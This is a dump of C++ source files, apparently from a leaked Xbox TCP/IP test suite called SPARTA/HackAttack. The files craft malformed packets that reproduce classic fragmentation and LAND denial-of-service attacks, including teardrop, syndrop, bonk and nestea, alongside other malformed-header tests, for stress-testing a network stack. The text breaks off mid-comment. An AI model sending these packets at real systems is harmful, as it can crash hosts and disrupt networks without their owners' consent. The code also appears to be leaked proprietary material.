	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(256);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 256);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 256 - UDPHEADER_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(16);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 64);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'b' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 64, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackSynDropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original syndrop attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackSynDropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CTCPPacket *pTCPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CTCPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_TCP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pTCPPacket = (CTCPPacket *) pIPPacket;
				pTCPPacket->TCPHeader.SetSrcPort(UDPPORT_SOURCE);
				pTCPPacket->TCPHeader.SetDestPort(UDPPORT_DEST);
				pTCPPacket->TCPHeader.SetSeqNumber(1000);
				pTCPPacket->TCPHeader.SetAckNumber(0);
				pTCPPacket->TCPHeader.SetHdrLength(UDPHEADER_SIZE + SYNDROP_SIZE * 2);
				pTCPPacket->TCPHeader.SetFlag(TCP_SYN);
				pTCPPacket->TCPHeader.SetWindowSize(15000);

				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + SYNDROP_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, UDPHEADER_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(SYNDROP_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + SYNDROP_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, SYNDROP_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackBonkAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackBonkAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
	
	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
			
			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + BONK_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + BONK_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, BONK_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(BONK_XVALUE + 1);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + BONK_XVALUE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, BONK_XVALUE + 1, TRUE);
				break;
			}
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}
		
		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackZeroLenOptAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a zero-length option
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackZeroLenOptAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	CHAR szFormattedDestMac[18];
	BOOL fSuccess = TRUE;
	BYTE PayloadData[1], *pBuffer = NULL;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
		pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(0);
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, IPADDR_SOURCE);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
		pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);

		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPAttackNesteaAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the nestea attack
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNesteaAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 3; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pUDPPacket = new CUDPPacket(MediaType);

			// Fill in the IP header fields
			pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pUDPPacket->MacHeader.SetProtocolType(0x800);
			pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pUDPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pUDPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pUDPPacket->IPHeader.SetProtocolType(PROTOCOL_TCP);
			pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pUDPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 10);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pUDPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 10);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 10, TRUE);
				break;
			case 1:
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 108);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(0);
				pUDPPacket->IPHeader.SetFragOffset(6);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 108);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 108, TRUE);
				break;
			default:
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 256);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pUDPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 296);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 256, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pUDPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		pUDPPacket ? delete pUDPPacket : 0;
		pUDPPacket = NULL;
	}

	return TRUE;
}

PATTACK_FUNCTION g_IPAttackFunctions[IPATTACK_MAXTEST] = 
{
	IPVersionSixAttack,
	IPVersionBadAttack,
	IPHeaderLenBelowMinAttack,
	IPHeaderLenMaxAttack,
	IPHeaderLenAboveTotalLenAttack,
	IPHeaderLenAboveAvailAttack,
	IPTosNormalAttack,
	IPTosNetControlAttack,
	IPTosLowDelayAttack,
	IPTosHighThroughputAttack,
	IPTosHighReliabilityAttack,
	IPTosReservedAttack,
	IPLengthBelowMinAttack,
	IPLengthAtMinAttack,
	IPLengthAboveMinAttack,
	IPLengthAboveTotalAttack,
	IPLengthBelowTotalAttack,
	IPLengthMaxAttack,
	IPIDMinAttack,
	IPIDMaxAttack,
	IPFlagReservedSetAttack,
	IPFlagDontFragAndMoreFragsAttack,
	IPTtlMinAttack,
	IPTtlMaxAttack,
	IPProtocolUnsupportedAttack,
	IPProtocolICMPTooSmallAttack,
	IPProtocolIGMPTooSmallAttack,
	IPProtocolTCPTooSmallAttack,
	IPProtocolUDPTooSmallAttack,
	IPProtocolUnsupportedTooSmallAttack,
	IPChecksumBadAttack,
	IPOptionsAboveAvailAttack,
	IPOptionsExactSizeAttack,
	IPOptionsEndOfOpsLastAttack,
	IPOptionsEndOfOpsFirstAttack,
	IPFragMaxSimulReassemblyAttack,
	IPFragAboveMaxSimulReassemblyAttack,
	IPFragFullReverseAttack,
	IPFragMidReverseAttack,
	IPFragLastInSecondAttack,
	IPFragMixedSizeAttack,
	IPFragOneHundredAttack,
	IPFragMultipleLastFragmentAttack,
	IPFragOverlappingFragmentsAttack,
	IPFragMaxDatagramSizeAttack,
	IPFragMaxReassemblySizeAttack,
	IPFragAboveMaxReassemblySizeAttack,
	IPFragOversizedFragmentsAttack,
	IPAttackTeardropAttack,
	IPAttackNewTeardropAttack,
	IPAttackImpTeardropAttack,
	IPAttackSynDropAttack,
	IPAttackZeroLenOptAttack,
	IPAttackBonkAttack,
	IPAttackNesteaAttack
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\HackAttack\resource.h ===
//{{NO_DEPENDENCIES}}
// Microsoft Developer Studio generated include file.
// Used by HackAttack.rc
//
#define IDM_ABOUTBOX                    0x0010
#define IDD_ABOUTBOX                    100
#define IDS_ABOUTBOX                    101
#define IDD_HACKATTACK_DIALOG           102
#define IDP_SOCKETS_INIT_FAILED         103
#define IDR_MAINFRAME                   128
#define IDC_MACADDRESS                  1001
#define IDC_CHECKTCP                    1003
#define IDC_CHECKUDP                    1004
#define IDC_CHECKIP                     1005
#define IDC_ESP                         1006
#define IDC_START                       1011
#define IDC_RESULTS                     1012

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        129
#define _APS_NEXT_COMMAND_VALUE         32771
#define _APS_NEXT_CONTROL_VALUE         1013
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\HackAttack\StdAfx.cpp ===
// stdafx.cpp : source file that includes just the standard includes
//	HackAttack.pch will be the pre-compiled header
//	stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\HackAttack\StdAfx.h ===
// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__1A176F3C_36C0_4D9C_A1A6_E4AB68ACD4D3__INCLUDED_)
#define AFX_STDAFX_H__1A176F3C_36C0_4D9C_A1A6_E4AB68ACD4D3__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT

#include <afxsock.h>		// MFC socket extensions
#include "spartaapi.h"

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__1A176F3C_36C0_4D9C_A1A6_E4AB68ACD4D3__INCLUDED_)
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\HackAttack\TCPAttacks.cpp ===
// TCPAttacks.cpp : Contains the Sparta code for various TCP layer attacks
//

#include "stdafx.h"
#include "AttackConstants.h"

//==================================================================================
// SendTCPSYNPacket
//----------------------------------------------------------------------------------
//
// Description: Function that sends a TCP packet
//
// Arguments:
//
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
BOOL SendTCPSYNPacket(CInterface *pInterface, CHAR *szDestMac, CHAR *szDestIP, WORD wDestPort, CHAR *szSourceIP, WORD wSourcePort, WORD wHeaderLength, BOOL fCalcHdrLen)
{
	CHAR szFormattedDestMac[18];
	BOOL fSuccess = TRUE;

	if(!szDestMac || (strlen(szDestMac) < 12))
		return FALSE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
    {
		// Create a TCP packet
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
        CTCPPacket TCPPacket(MediaType);
    
		// Create Mac addresses for the source and destination
        CMacAddress ClientMacAddr(MediaType, szFormattedDestMac); 
    
        TCPPacket.MacHeader.SetDestAddress(ClientMacAddr);
        TCPPacket.MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
        TCPPacket.MacHeader.SetProtocolType(PROTOCOL_TYPE_IP4);
    
        TCPPacket.IPHeader.SetVersion(4);
        TCPPacket.IPHeader.SetTOS(0);
        TCPPacket.IPHeader.SetID(1);
        TCPPacket.IPHeader.SetTTL(1);
        TCPPacket.IPHeader.SetFragOffset(0);
        TCPPacket.IPHeader.SetFlag(0);
        TCPPacket.IPHeader.SetProtocolType(PROTOCOL_TYPE_TCP);
        TCPPacket.IPHeader.SetDestAddr(szDestIP);
        TCPPacket.IPHeader.SetSrcAddr(szSourceIP);
    
        TCPPacket.TCPHeader.SetSrcPort(wSourcePort);
        TCPPacket.TCPHeader.SetDestPort(wDestPort);
        TCPPacket.TCPHeader.SetSeqNumber((INT) GetTickCount());
        TCPPacket.TCPHeader.SetAckNumber(0);
        TCPPacket.TCPHeader.SetFlag(TCP_SYN);
		TCPPacket.TCPHeader.SetWindowSize(17016);

		if(!fCalcHdrLen)
		{
			TCPPacket.TCPHeader.SetAutoCalcLength(OFF);
			TCPPacket.TCPHeader.SetHdrLength(wHeaderLength);
		}

		TCPPacket.TCPHeader.Options[0].AddMSS(MSS_DEFAULT);

        pInterface->Send(TCPPacket);
    }
    catch(CSpartaException *Ex)
    {
		fSuccess = FALSE;
        delete Ex;
    }

    return fSuccess;
}

//==================================================================================
// TCPDataOffBelowMinAttack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with a data offset that is lower than the
// minimum header length of a TCP packet
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffBelowMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_SOURCE, TCPPORT_DEST, 16, FALSE);
}

//==================================================================================
// TCPDataOffAboveAvailAttack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with a data offset that is the maximum value
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffAboveAvailAttack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_SOURCE, TCPPORT_DEST, 60, FALSE);
}

//==================================================================================
// TCPLand1Attack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with the return address set to the target address
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPLand1Attack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_LOOPBACK, TCPPORT_DEST, 0, TRUE);
}

//==================================================================================
// TCPLand2Attack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with the return address set to the target address
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPLand2Attack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_SOURCE, TCPPORT_DEST, 0, TRUE);
}

PATTACK_FUNCTION g_TCPAttackFunctions[TCPATTACK_MAXTEST] = 
{
	TCPDataOffBelowMinAttack,
	TCPDataOffAboveAvailAttack,
	TCPLand1Attack,
	TCPLand2Attack
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\adapterinfo.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: adapterinfo.h                                                               *
* Description: defines the structures used by the driver and user mode code to share    *
*              information about bound adapters.                                        *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/16/2000    created                              *
*                                                                                       *
*                                                                                       *
